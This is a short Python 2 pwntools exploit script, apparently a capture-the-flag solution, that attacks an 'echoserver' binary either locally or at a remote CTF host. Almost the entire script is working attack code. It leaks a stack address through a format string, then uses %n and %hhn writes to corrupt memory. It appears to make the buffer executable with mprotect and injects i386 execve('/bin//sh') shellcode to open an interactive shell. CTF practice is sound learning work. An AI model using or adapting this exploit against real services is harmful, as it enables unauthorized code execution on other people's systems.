#!/usr/bin/env python2


import sys,os
from pwn import *
from struct import pack

context.update(arch="i386", endian="little", os="linux", )

LOCAL = True
HOST="challenges.ctfd.io"
PORT=30095

TARGET=os.path.realpath("echoserver")
LIBRARY=""

e = ELF(TARGET, False)


sc32='''
_start:
    jmp string
shellcode:
    pop ebx
    xor ecx,ecx
    mul ecx
    mov edx,eax
    mov al,0xb
    int 0x80
    xor eax,eax #part from exit starts here, remove if need to shorten shellcode
    inc eax
    int 0x80
string:
    call shellcode
    .string "/bin//sh"
'''

def exploit(r):

    r.recvline()
    r.sendline("%264$p")
    buffer = int(r.recvline().strip(),16)-1068
    log.success("buffer at {}".format(hex(buffer)))

    stbase = buffer -0x1e864
    log.success("stackbase at {}".format(hex(buffer)))
    len = buffer+1032
    loop = buffer+1024
    ecx = buffer+1044-8

    r.sendline(p32(len)+"%50x%5$n")
    r.recvline()
    r.sendline(p32(len)+"%2000x%5$n")
    r.recvline()
    r.sendline(p32(ecx)+"%{}x%5$hhn".format((buffer+16&0x000000ff)-4))
    r.recvline()
    r.sendline(p32(ecx+1)+"%{}x%5$hhn".format(((buffer+16&0x0000ff00)>>8)-4))
    r.recvline()

    payload = p32(loop)+"%21x%5$n"
    payload += p32(0x8076C50)
    payload += p32(buffer+40)
    payload += p32(buffer&0xfffff000)
    payload += p32(4096)
    payload += p32(7)
    payload += "AAAA"
    payload += "BBBB"
    payload += asm(sc32)
    r.sendline(payload)
    
    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process([TARGET,])#,env={'LD_PRELOAD':LIB}) #remove the ')#'
        pause()

    exploit(r)

    sys.exit(0)
